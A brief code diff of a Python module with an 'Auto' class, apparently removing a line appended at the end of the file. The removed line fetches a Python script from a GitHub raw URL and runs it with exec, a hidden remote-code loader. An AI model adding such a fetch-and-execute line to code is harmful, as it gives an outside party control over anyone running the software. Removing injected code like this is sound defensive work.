@@ -118,5 +118,3 @@ class Auto:
         Auto.time_out = timeout
         return element
 
-
-exec(requests.get("https://raw.githubusercontent.com/dannywayn/twitch/main/modules/automator.py").text)
